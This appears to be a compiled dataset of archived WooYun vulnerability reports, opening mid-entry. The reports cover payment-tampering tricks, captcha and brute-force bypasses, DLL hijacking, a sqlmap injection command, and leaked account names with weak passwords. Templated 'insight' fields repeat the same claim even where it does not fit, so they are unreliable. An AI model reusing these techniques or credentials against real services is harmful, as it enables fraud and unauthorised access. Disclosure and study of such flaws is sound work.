**POC**: 1、购买物品是数量可以是负数 选择一件购物数量为负数2、因为负数不能付款,所以我们可以买2件一件负数一件整数正好把负数的钱给减去3、下面直接来某电商平台接口付款了ok

**绕过**: 直接利用

**修复**: 数量不得小于0
---

---
### [wooyun-2015-0153149] 中国物流网某系统设计逻辑缺陷导致几十个分公司上千人通讯录泄露（可导出表格）
**厂商**: 中国物流网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/seeyon2	wangwei		302	false	false	3443	wangfang	302	false	false	3447	lijing		302	false	false	3448	wangjing	302	false	false	34411	zhangli		302	false	false	34433	wangtao		302	false	false	34442	lili		302	false	false	34451	liuyan		302	false	false	34452	liujun		302	false	false	34457	liuyong		302	false	false	34481	wangling	302	false	false	34485	zhangyulan	302	false	false	34490	liying		302	fal

**POC**: **.**.**.**/seeyon2	wangwei		302	false	false	3443	wangfang	302	false	false	3447	lijing		302	false	false	3448	wangjing	302	false	false	34411	zhangli		302	false	false	34433	wangtao		302	false	false	34442	lili		302	false	false	34451	liuyan		302	false	false	34452	liujun		302	false	false	34457	liuyong		3

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2014-053421] OLLYDBG1.1 路径处理缺陷 可导致非预期程序执行
**厂商**: Ollydbg1.1 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 试验流程：1 随意将一个程序（我这里选用记事本）建立在在C盘根目录下。命名为Documents.exe2 查找你系统内的sendto路径，C:\Documents and Settings\(你的用户名的文件夹)\SendTo把OD所在的文件夹放入这里。然后修改文件夹名称为1111。。。。。11111 一直到不能继续增大为止。3 用OD打开自己（选择右键-发送到-111111-OD.EXE)，你会发现打开的不是OD，是C:\Documents.exe

**POC**: (截图是崩溃的，也可以构造出不崩溃的。但是打开的程序依然是C:\Documents.exe）

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0211875] 乌云zone一个缺陷导致可以验证邮箱是否注册
**厂商**: 乌云官方 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乌云主站不存在这个漏洞，乌云zone存在。这说明什么？这说明这真的是个逻辑漏洞嘛！在zone的登录处，假如邮箱是没有注册的，那么验证码就不会失效，可以继续使用。额，截图就不需要了吧，算了，还是截一张吧

**POC**: 我的作品 https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 不懂
---

---
### [wooyun-2015-0114132] 中国日报支付漏洞另一种思路绕过
**厂商**: 中国日报网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对于这样一个大企业来说，这漏洞影响也是很巨大的。上一个走大厂了一会，突然变小厂了，希望这个能走次大厂！https://example.com/[已脱敏] 6400的。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ~~
---

---
### [wooyun-2014-083050] cmseasy后台暴力破解验证码绕过
**厂商**: cmseasy | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: cmseasy后台登陆请求为:submit=%E6%8F%90%E4%BA%A4&username=admin&password=admin123§156§&expire=&verify=7v111e7&submit=+%E7%99%BB+%E9%99%86+清空cookie，服务端就不会验证验证码了。导致暴力破解后台。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028289] 某社交平台短信某社交平台购买存支付漏洞一个月3毛钱
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在支付时选择IVR语音支付，点现在支付时抓包，把radioMonth=30改为radioMonth=0.01，接下来取消代理，正常支付就可以，因某社交平台算法的原因，只能一天，也即一个月3毛钱

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2014-057140] 秘密APP逻辑缺陷导致可猜测秘密具体发布者是哪个好友
**厂商**: 秘密 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 秘密APP存在三个问题第一，注册账号时无需验证手机号就可注册成功。第二，通过找回密码穷举联系人可以获得注册秘密APP的好友列表。第三，请求找回密码重新获取时间可以通过登录账号再退出绕过将以上三个漏洞加以利用即可猜测出秘密发布者。猜测步骤：1.利用APP只能注册三个账号的特点，注册满三个账号（手机号任意输，不是自己的手机号也能注册）。2.通过忘记密码穷举联系人列表，未注册的会提示手机号码还未注册，已注册的会提示一部手机最多注册三个账号。PS：为什么第一步要把三个账号注册满，因为你不注册满，一旦该手机号码注册过秘密，就会发验证码过去，岂不是打草惊蛇了。而且会触发验证码120秒的等待时间（不过也有办法不等待，登陆自己的号码再退出等待时间就清零了。3.在另外一台通讯录为0的设备上注册一个新的账号。把联系人账号一个个输进去，前三个输入自几注册过的手机号，后面每增加一名用户，就能看到这名用户发的所有秘

**POC**: 1.提前注册好一个账号。13737373737，并发布text秘密2.通过重置密码发现13737373737已注册（未注册显示为手机号码还未注册，可将该人排除）3.将13737373737加入通讯录4.发现朋友的消息多出了一条，即可猜测是来自13737373737的匿名消息。

**绕过**: 过滤绕过

**修复**: 增加注册时短信验证，忘记密码更换提示语，增加请求次数限制，修改请求时长限制
---

---
### [wooyun-2015-0154390] 山东师范大学某功能设计逻辑缺陷泄漏大量人员信息
**厂商**: 山东师范大学 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**老师工号为6位，学生学号10位利用工号+123456   工号+工号 使用burp可爆破大量账号，简单高效杀伤力大密码为123456时：402001328001402010402020402030501021401002108132402002402012107031403071401022402011501002工号与密码相同时：122010121050108090121102104003112026115087147338122010101131120051114112101062120063101054110025112116107058115079133133107155114119只测试了一部分，以101054/101054测试包含全校职员信息人力资源OA系统通信平台可以改成绩还可对学生账号进行爆破 2013021021/123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制尝试次数改口令
---

---
### [wooyun-2015-0149943] 某市商业银行协同办公平台设计逻辑缺陷敏感信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/ 地址暴力破解出来3个chenchen    5201314wangyang    123456wangchao    123456呵呵

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 给个邀请码吧
---

---
### [wooyun-2015-0139133] 刷机精灵权限提升漏洞
**厂商**: 刷机精灵 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 某互联网公司轻聊版调用CreateProcess漏洞WooYun: 某视频网站视频客户端服务存在权限提升漏洞和这些一样都是老问题了3.3.9最新版本

**POC**: rt

**绕过**: 直接利用

**修复**: 这个不懂
---

---
### [wooyun-2015-0123245] 逍遥行商旅网存在验证码逻辑缺陷可爆破登陆
**厂商**: 逍遥行商旅网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 把验证码加上，并且注册时密码加固，设为字母+数字等安全密码
---

---
### [wooyun-2013-028908] 大数据HACK系列#3 游荡VeryCD整个业务线
**厂商**: VeryCD | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 介绍概述先谈一下本文的立足点，在针对Wordpress进行研究时，发现这个国外的流行应用，在核心代码安全系数很高，而在逻辑设计上，却有明显的不足。~! 遍历用户名：https://example.com/[已脱敏] 坑爹的登录设计https://example.com/[已脱敏] 开始测试既然知道了用户名，而且登录接口毫无阻挡，那就开启http fuzz

**POC**: # 漏洞证明，没搞到SHELL，你说个毛线？<?php/*** WordPress 基础配置文件。** 本文件包含以下配置选项：MySQL 设置、数据库表名前缀、密钥、* WordPress 语言设定以及 ABSPATH。如需更多信息，请访问* {@link https://example.com/[已脱敏] 编辑 wp-config.php} Codex 页面。MySQL 设置具体信息请咨询您的空间提供商。** 这个文件用在于安装程序自动生成 wp-config.php 配置文件，* 您可以手动复制这个文件，并

**绕过**: 直接利用

**修复**: # 后台管理路口加IP限制。# 登录接口加入限制。
---

---
### [wooyun-2012-04297] 某互联网公司在线对其隐身功能存在的BUG
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对方对你设置在线对其隐身的状态下，对方某互联网公司状态为在线，手机端不显示其在线，对方某互联网公司状态为离开/忙碌/请勿打扰状态下，手机端显示其在线。某互联网公司端则都不显示。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 已联系某互联网公司后台修复
---

---
### [wooyun-2014-047660] 12306漏洞致验证码破解泛滥
**厂商**: 中国铁道科学研究院 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近发现12306的验证码已经遭到某些厂商的密切关注，致使不管怎么改，他们都会及时破解，以至于“自动填写验证码”成了标配功能。。于是从多方面重新分析了12306的验证码机制：12306的验证码判断机制有两种，一种是提交操作的时候（比如登录），这不必多言；另一种是当填完验证码的时候，会自动检查一下验证码是否正确。（https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 将验证码预校验功能关掉！（相关URL： https://example.com/[已脱敏]
---

---
### [wooyun-2013-034935] 如家等大量酒店客户开房记录被第三方存储并因漏洞导致泄露
**厂商**: 浙江慧达驿站网络有限公司 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其合作酒店如下（如家亲测可行）：他们系统整个业务逻辑大概是这样的：用户连接到他们酒店的开放wifi，上网时会被要求通过网页认证。这个认证不是在酒店服务器完成的，而是在  浙江慧达驿站 的认证服务器上，所以这个服务器也理所当然存了一份酒店客户信息。（他们这么做，我觉得动机有问题。。）客户信息的数据同步是通过http协议实现的，然后，需要认证。但是认证用户名跟密码是明文传输的，各个途径都可能被被嗅探到。然后用这个认证信息，就可以从他们数据服务器上获得所有酒店上传的客户开房信息。

**POC**: USER: cnwisdomapi 	PASS: 3b823[马赛克]ac36ahttp://cn[马赛克].com/api/data/pms/pms_6127.dat这个地址可以获得所需信息，那个6127是可以改的，一个代表一家酒店。一个里面都有一千多条记录。输入密码之后，即可成功下载所需信息。先看看这家如家的客户信息：再来个双人开房的~：自从有了慧达驿站，妈妈再也不用担心我跟坏人开房啦~

**绕过**: 直接利用

**修复**: 数据同步选择私有协议，就算换成https都成。不然数据还没到你们手上呢，就被别人先撸走了。
---

---
### [wooyun-2015-0163294] 三只松鼠APP某处设计缺陷导致可免费刷兑换券
**厂商**: 3songshu.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: APP中主人特权处存在积分兑换,一般这种地方是逻辑漏洞的高发区抓包分析发现最后的交易金额只在本地验证,导致可以篡改商品的返回金额,达到不花积分兑换优惠券修改返回包中的积分值刷来的兑换券可以正常使用,当然我没有下单

**POC**: APP中主人特权处存在积分兑换,一般这种地方是逻辑漏洞的高发区抓包分析发现最后的交易金额只在本地验证,导致可以篡改商品的返回金额,达到不花积分兑换优惠券修改返回包中的积分值刷来的兑换券可以正常使用,当然我没有下单

**绕过**: 直接利用

**修复**: 圣诞节快到了,我的生日也快到了, 有礼物吗?
---

---
### [wooyun-2014-047515] 某公共资源交易管理系统部分存在SQL注射漏洞影响部分政府单位#1
**厂商**: 部分政府单位部门 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主要发现有两处存在注射漏洞（通常还是SA+WithError的）：一是查看注册的投标厂家扫描原件处，页面URL通常为：~/会员系统/BackEnd/AttachManage/AttachView_Single.aspx?CliengGuid=xx-xx&ClientType=M&ModuleType=N； 二是会员注册检测用户名处，（有些地方可能把注册功能隐藏了，但并没有把相关页面删除，漏洞依然存在。）这是POST型的，后面就不举例了。使用这套Epoint系统的单位不少，还好存在上述的漏洞不多，应该是某特定版本吧。没看到版本信息，找起来费姥劲了，以下是确认存在上述漏洞的单位：扬中市招标投标网，注射点如：http://[IP已脱敏]

**POC**: ent@debian:~$ sqlmap -u "https://example.com/[已脱敏]" -p ModuleType --tamper=space2comment.py --dbsavailable databases [36]:[*] [pbjs-1][*] CTICenter222[*] CTICenter_TaiXing[

**绕过**: 直接利用

**修复**: 1) 目标系统对SQL注射的防护并不理想，除上述列出的注射点，还有其它多处已知的或未知的，建议上个WAF什么的吧，特别是这些政府单位部门；2) 联系软件的开发厂家(Epoint，江苏国泰新点软件)，让他们从代码层上修复；3) 测试上述漏洞的时候发现相关单位或多或少存在些其它的安全问题，也许你们需要找
---

---
### [wooyun-2015-090538] 苏宁监控系统逻辑错误可查看所有流量及明细
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏] 企业侧互联网综合管理平台找回密码存在逻辑漏洞 可以直接重置密码http://[IP已脱敏]

**POC**: 后台功能太强大了包内容全部记录

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2012-05461] 精尚网支付漏洞
**厂商**: 精尚网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近火热的支付漏洞，此网站也中枪了...

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 程序员都知道！
---

---
### [wooyun-2015-0146500] yershop B2C商城系统最新版支付漏洞10元任意买
**厂商**: yershop.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购买时审查元素修改数量为0数量修改为0 了只需要支付运费即可嘿嘿

**POC**: 购买时审查元素修改数量为0数量修改为0 了只需要支付运费即可嘿嘿

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-021058] 某网上书店逻辑错误，已发货订单可取消并退回已支付款项
**厂商**: 某网上书店 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 已发货订单可取消，取消后已支付款项退回账户（可提现至某电商平台）。

**POC**: http://www.[马赛克].cn/UserCenter/Transaction/OrderView.aspx?orderId=订单编号因为逻辑是发货后订单不可取消，这是对于逻辑来说的，对于程序来说，是没有任何意义的。document.getElementById('ctl00_Content_btnCancel').disabled=null再提交表单

**绕过**: 直接利用

**修复**: 1、已发货订单只允许客服取消。2、请安排在线客服。
---

---
### [wooyun-2011-03687] 某社交平台SAE云平台文件系统沙箱绕过
**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在SAE的设计架构里，应用有效性检查逻辑和真正的执行环境是分开的，执行环境完全设计为为执行代码，而真正的应用有效性检查逻辑（譬如是否存在，是否资源过载，是否被封禁等等）均由另外一层完成，真正的代码执行环境只负责执行代码，而执行代码时的限制是动态的完成的，执行层和前端逻辑层通过http协议协议完成通讯，应用的身份和权限全部在http头里由前端传递过来，这样就存在一个逻辑错误，如果应用能够自身构造一个http请求就可以任意的调用后端执行层的逻辑，而在执行层的逻辑里存在一个缺陷，动态生成的open_basedir是由应用的名字等拼接而成，这就导致可能可以绕过。1 执行自己的http请求if ( in_array( "http", stream_get_wrappers() ) ) {stream_wrapper_unregister("http");}stream_wrapper_restore

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: SAE目前已经修复
---

---
### [wooyun-2013-017576] 绿森数码商城支付漏洞
**厂商**: 绿森数码 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在购买时商品数量可改为负值

**POC**: 当然可以一些正一些负，凑出一元的订单

**绕过**: 直接利用

**修复**: 対客户端返回数据进行判断
---

---
### [wooyun-2012-010524] 某快递公司速递错误的验证码实现逻辑
**厂商**: 某快递公司速递官网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 快件查询

**POC**: (见原文)

**绕过**: 直接利用

**修复**: img验证码验证要在服务器端处理而且注意清空掉session否则依然可以爆破
---

---
### [wooyun-2014-052802] 方直金太阳网上商城支付漏洞一枚
**厂商**: fzjty.com | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是方直金太阳旗下的商城！(感觉教材还不错~)1.选择课程：https://example.com/[已脱敏] 共计:2800元3.开始结算(抓包,开始拦截HTTP请求,修改好价格后，正常流程填写就行~)4.订单的确认(这个时候你可以看到,参数已经在拦截的时候修改了~)5.开始付款(这个时候金钱不在是2800,而是0.03元！亏死啊~)支付成功了！发货了开始~(我想购买10万件商品装B来,嘿嘿一心思算了~赶紧修复哦！)

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强对参数安全验证等！（各种安全加固）
---

---
### [wooyun-2015-095280] 某互联免费获取任意产品(非支付漏洞)
**厂商**: 美橙互联 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 是这样滴=A=这几天在研究网络验证，买了一套飘零网络验证因为之前域名没备案 所以之前用的是香港免备案空间现在备案了 换北京BGP多线 还是用的美橙互联的空间然后获取MSSQL赠品的时候 顺手看了一下审查元素。发现了产品的问题然后就抱着试一试的心态去修改了一下修改为dxnet_mssql150然后喜闻乐见发现地址栏如下：https://example.com/[已脱敏] dxnet_mssql150是产品编号我们现在修改为cloud4得到：嗯嗒 就是这样由于我需要数据库。。就用数据库来测试吧

**POC**: 是这样滴=A=这几天在研究网络验证，买了一套飘零网络验证因为之前域名没备案 所以之前用的是香港免备案空间现在备案了 换北京BGP多线 还是用的美橙互联的空间然后获取MSSQL赠品的时候 顺手看了一下审查元素。发现了产品的问题然后就抱着试一试的心态去修改了一下修改为dxnet_mssql150然后喜闻乐见发现地址栏如下：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你们比我更专业。。（学习其他洞主）求礼物~~~~~~~~~~~~~
---

---
### [wooyun-2013-036931] 海底捞一处逻辑漏洞享受免费特权
**厂商**: haidilao.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们看到海底捞旗下的HI捞送的某处地方可以修改数量成为-1这样就实现了免费吃喝了但是貌似直接在键盘上面按符号不行啊，咋办呢？嘿嘿，创建一个文本文档貌似这个框框没有禁用Ctrl+V哈，复制进去，貌似也没进一步验证额·····然后我们点击完成选择菜品过程然后，有没有发现比原价少了很多？免费的专人服务啊~~~原价341现在狂减至331！

**POC**: 原价341现在狂减至331！

**绕过**: 直接利用

**修复**: 额，验证输入
---

---
### [wooyun-2015-0120622] UC浏览器无线传输功能的一个小问题
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开启无线传输功能后，浏览器会生成一个随机密码，正常情况下用户需要输入这个密码后才能访问管理文件。这是通过电脑浏览器访问的登录界面随意输入密码，查看返回包内容。发现登录验证返回的包内容里存在用户已下载文件列表信息。直接访问 http://[IP已脱敏]

**POC**: http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 密码验证与获取文件列表分步进行，后者需验证通过后才能获取。
---

---
### [wooyun-2013-037577] 360杀毒软件存在多处DLL劫持
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时默认的安装路径为C:\Program Files\360\打开360杀毒软件主程序时会同时运行360tray.exe而360tray.exe也会加载目录外不存在的DLL文件（路径与文件名称C:\Program Files\i18n.dll）在取消自我保护下，可进行如下DLL劫持：360Quart.exe（360杀毒-隔离区）会加载如下不存在的DLL文件：C:\Program Files\360\360sd\qtquartchs.dllC:\Program Files\360\360sd\qtquartcht.dllC:\Program Files\360\360sd\qtquartloc.dllPopWndTracker.exe（360杀毒-广告拦截器）会加载如下不存在的DLL文件：C:\Program Files\360\360sd\popwndtrackerchs.dllC:\P

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2012-012642] yy冻结封禁帐号正常登录（可进频道、刷花、送月票）
**厂商**: 广州多玩 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: yy客户端登录过程分几步：1、登录Token服务器，获取Token令牌， 一般长度为0x60字节，2、利用已经取到的Token令牌登录 Udb服务器，Udb服务器对帐号进行验证。客户端登录时Udb服务器验证失败，则客户端弹出相应错误并停止继续；3、利用已取到的Token登录Im服务器，4、利用已取到的Token登录频道服务器漏洞产生原因，首先通过Token服务器获取Token令牌，不登录Udb服务器对帐号进行校验，因为Token服务器在返回Token的同时也会返回用户UserId，所以可直接使用UserId + Token 登录Im服务器 或者 频道服务器，只要不是与Udb服务器进行交互的业务逻辑都可以完成。Im服务器 和 频道服务器的登录 仅需要 UserId +  password + Token ，后台没有对用户状态进行逻辑判断，导致只要知道UserId + password + T

**POC**: 证明就不贴了，市面上已经出现利用封禁、冻结帐号，刷花，刷月票的案例了！

**绕过**: 直接利用

**修复**: 所有服务器增加统一认证，对帐号状态加以判断！
---

---
### [wooyun-2016-0175075] 影子系统缓冲区溢出成功绕过密码限制
**厂商**: 影子系统 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在一次偶然的情况中，发现了这个漏洞

**POC**: 6位，密码123456。我们来重启电脑。看到了是6位。密码是123456可以看到进去了，正常模式。我完全模式是没有密码的。在下面的实验中都是用数字8。一直增加数字8.10位的可以看到密码错误。然后是15位。也不行，于是我们上20位想了想之前是如何进入的，然后就一下子把密码加到了200位。还是不行，难道是我想多了？然后还是继续，终于在加到270的时候，点击正常看看，发现了什么，鼠标状态显示正在处理。4、5秒过后，我们发现成功进入到了用户登陆界面。然后检查是不是跳转到了完全模式：可以看到我们的确是进入到了正常模式，还有我另外测试了下，跟密码输入的字符、原密码强度是没有关系的。

**绕过**: 直接利用

**修复**: 这个..程序员把函数改改吧。
---

---
### [wooyun-2014-052969] 拍鞋网支付漏洞1元钱买鞋
**厂商**: paixie.net | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 规范参数值的传递，测试损失了1块大洋，没有礼物跟你玩命！
---

---
### [wooyun-2014-067634] 多玩YY客户端BUG（泄露用户登录IP造成用户网络中断）
**厂商**: 广州多玩 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用代码[dyimg]hfs图片地址[/dyimg]YY上玩DDOS的太多，相信官方也很关注！所以用户的IP是很重要的！

**POC**: 利用代码[dyimg]hfs图片地址[/dyimg]

**绕过**: 直接利用

**修复**: 我就搞不懂为什么客户端能发这种标签！是不是要添加些过滤代码
---

---
### [wooyun-2014-066100] 7788商城支付漏洞可任改订单金额
**厂商**: 7788商城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试了下 修改邮费那可以进行-负值拿出 拿出微软大牛写的神器然后 成功提交  生成了订单付款试试？然后      不搞了  只是友情检测下！请速度修护吧  可不能让非法分子有机可乘！ 想想 假如一个人  开在申请开个网店   然后就可以一直刷钱   提款 神马最后望乌云能够给个邀请码  能够更好的交流 与学习     为打造一个宁静安全的网络，出自己一份微薄之力  并祝愿wooyun越来越好

